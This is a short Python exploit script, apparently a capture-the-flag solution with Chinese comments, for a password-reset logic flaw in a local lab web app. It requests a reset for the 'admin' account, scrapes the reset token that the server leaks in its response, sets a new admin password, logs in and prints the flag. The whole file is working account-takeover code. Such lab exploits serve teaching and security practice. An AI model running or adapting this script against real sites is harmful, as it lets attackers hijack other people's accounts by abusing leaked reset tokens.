#!/usr/bin/env python3
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
# 33-logic-reset-token: 重置 token 在响应中泄露 -> 劫持 admin
import re, sys, requests

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1

BASE = os.environ.get("GKD_URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34941")
VICTIM = "admin"
NEW_PWD = "pwned123"

s = requests.Session()

# Step 1: 触发忘记密码，服务端把本应通过邮件发送的重置链接直接返回
r = s.post(f"{BASE}/forgot", data={"username": VICTIM})
m = re.search(r"/reset\?user=([^&]+)&token=([0-9a-f]+)", r.text)
if not m:
    print("[-] 未拿到 token，响应：", r.text); sys.exit(1)
user, token = m.group(1), m.group(2)
print(f"[+] 泄露 token: user={user} token={token}")

# Step 2: 用泄露的 token 重置 admin 密码
r = s.post(f"{BASE}/reset",
           data={"user": user, "token": token, "new_password": NEW_PWD})
print(f"[+] 重置结果: {r.text.strip()}")

# Step 3: 登录被劫持的 admin 账户，首页直接显示 flag
r = s.post(f"{BASE}/login",
           data={"username": VICTIM, "password": NEW_PWD},
           allow_redirects=True)
flag = re.search(r"TOGOGO-flag\{[^}]+\}", r.text)
print(f"[*] FLAG: {flag.group(0) if flag else '未找到，原文：' + r.text}")
